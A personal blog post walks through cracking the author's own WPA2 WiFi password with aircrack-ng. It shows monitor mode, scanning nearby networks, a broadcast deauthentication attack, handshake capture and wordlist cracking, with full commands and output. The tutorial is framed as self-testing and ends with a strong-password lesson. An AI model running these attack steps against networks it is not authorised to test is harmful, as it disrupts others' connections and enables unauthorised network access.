---
permalink: /misc/hackingmywifi
title: Hacking my own WiFi password
---

<br>

The aircrack-ng packages gives us everything we need:

```
[connor@fedora]$ sudo dnf install aircrack-ng
```

Then run airmon-ng with no arguments to see if your wifi card supports monitor mode.

```
[connor@fedora]$ sudo airmon-ng  
  
PHY     Interface       Driver          Chipset  
   
phy0    wlp3s0          iwlwifi         Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
```

Luckily mine does, if nothing shows up then you may need a USB wifi adapter. 
[David Bombal has a good video on various ones](https://www.youtube.com/watch?v=5MOsY3VNLK8).

Moving on...

```
[connor@fedora]$ sudo airmon-ng check kill  
  
Killing these processes:  
  
   PID Name  
  1135 wpa_supplicant  
  
[connor@fedora]$ sudo airmon-ng start wlp3s0  
  
  
PHY     Interface       Driver          Chipset  
   
phy0    wlp3s0          iwlwifi         Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)  
               (mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)  
               (mac80211 station mode vif disabled for [phy0]wlp3s0)  
  
```

Then you can start listening (I've hidden my neighbours' data and changed my own):

```
[connor@fedora]$ sudo airodump-ng wlp3s0mon


BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                
                                                                                                                                                                                                                                       
XX:XX:XX:XX:XX:XX  -86       17        1    0   1  130   WPA2 CCMP   PSK  XXXXXXXX                                                                       
XX:XX:XX:XX:XX:XX  -82      104       23    0   1  195   WPA2 CCMP   PSK  XXXXXXXX                                                                     
XX:XX:XX:XX:XX:XX  -69      452      170    0   2  130   WPA2 CCMP   PSK  XXXXXXXX                                                                    
AB:CD:12:34:EF:56  -35      605      133    1  11  195   WPA2 CCMP   PSK  Optus_BF826B
```

Then listening to mine specifically and waiting for a handshake:

```
sudo airodump-ng -c 11 --bssid AB:CD:12:34:EF:56 -w ./mywifi wlp3s0mon
```

Then a deauthentication attack (I sent 10 deauthentication packets):

```
[connor@fedora]$ sudo aireplay-ng -0 10 -a AB:CD:12:34:EF:56 wlp3s0mon     
10:24:10  Waiting for beacon frame (BSSID: AB:CD:12:34:EF:56) on channel 11  
NB: this attack is more effective when targeting  
a connected wireless client (-c <client's mac>).  
10:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]   
10:24:12  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:12  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:13  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:13  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
10:24:14  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]    
10:24:14  Sending DeAuth (code 7) to broadcast -- BSSID: [AB:CD:12:34:EF:56]  
```

Then the listener captured a WPA handshake!

It created a file mywifi-01.cap which we can try to crack.

I made a small wordlist with the real password to test:

```
[connor@fedora]$ aircrack-ng mywifi-01.cap -w wordlist



                              Aircrack-ng 1.7    
  
     [00:00:00] 8/18 keys tested (311.24 k/s)    
  
     Time left: 0 seconds                                      44.44%  
  
                        KEY FOUND! [ <REDACTED> ]  
  
  
     Master Key     : xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx    
                      xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx      
  
     Transient Key  : xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx      
                      xx xx xx xx xx xx xx 00 00 00 00 00 00 00 00 00    
                      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
                      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
  
     EAPOL HMAC     : xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx  
```

aircrack-ng succeeded in cracking it. This shows the importance of having a strong wifi password!

